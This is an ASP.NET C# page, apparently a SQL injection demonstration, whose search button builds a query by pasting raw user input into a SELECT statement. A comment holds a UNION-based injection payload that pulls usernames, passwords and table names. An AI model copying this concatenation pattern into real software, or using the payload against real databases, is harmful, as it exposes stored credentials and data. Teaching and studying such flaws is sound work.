using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Data;
using System.Data.SqlClient;
using System.Configuration;

namespace SqlInjection.Web
{
    public partial class MySqlInjection : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {

        }

        protected void btnSearch_Click(object sender, EventArgs e)
        {
            SqlConnection connection = new SqlConnection(ConfigurationManager.ConnectionStrings["StudentDBConnectionString"].ConnectionString);

            SqlCommand command = new SqlCommand();
            command.Connection = connection;
            command.CommandText = "SELECT * FROM StudentMasters WHERE StdName='" + txtSearch.Text + "'";

            connection.Open();
            SqlDataReader reader = command.ExecuteReader();

            gvItems.DataSource = reader;
            gvItems.DataBind();

            reader.Close();


            // ' or 1=1 union select 1,username,password,'','' from dummy_users union select 1,TABLE_NAME,'','','' FROM INFORMATION_SCHEMA.TABLES --

        }
    }
}